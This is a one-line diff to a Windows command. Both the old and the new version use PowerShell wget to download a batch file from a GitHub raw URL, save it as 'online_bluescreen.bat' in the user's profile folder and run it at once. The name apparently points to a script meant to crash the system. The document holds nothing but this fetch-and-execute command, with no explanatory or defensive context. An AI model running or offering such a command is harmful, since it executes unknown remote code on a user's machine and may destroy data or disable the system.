@@ -1,1 +1,1 @@
-powershell /c @echo off ; wget https://raw.githubusercontent.com/harryaldwithjarryald/ProjectCMD/main/ProjectCMD.bat -outfile online_bluescreen.bat ; .\online_bluescreen.bat
+cmd /c @echo off & cd %userprofile% & powershell /c wget https://raw.githubusercontent.com/harryaldwithjarryald/ProjectCMD/main/ProjectCMD.bat -outfile online_bluescreen.bat && "%userprofile%\online_bluescreen.bat"
